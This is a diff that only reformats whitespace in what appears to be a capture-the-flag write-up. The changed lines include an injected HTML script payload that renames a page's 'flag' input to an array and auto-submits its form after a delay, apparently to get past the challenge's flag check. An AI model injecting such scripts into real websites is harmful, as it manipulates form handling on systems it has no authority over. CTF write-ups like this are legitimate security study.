@@ -24,7 +24,7 @@ aliases = [
 ]
 +++
 
-- Points: 1500
+-   Points: 1500
 
 ## Description
 
@@ -88,12 +88,12 @@ I came up with the following code:
 
 ```html
 <script>
-  setTimeout(() => {
-    let flagInput = document.getElementById("flag");
-    flagInput.name = "flag[]";
-    flagInput.value = "hi";
-    flagInput.form.submit();
-  }, 1000);
+    setTimeout(() => {
+        let flagInput = document.getElementById("flag");
+        flagInput.name = "flag[]";
+        flagInput.value = "hi";
+        flagInput.form.submit();
+    }, 1000);
 </script>
 ```
 
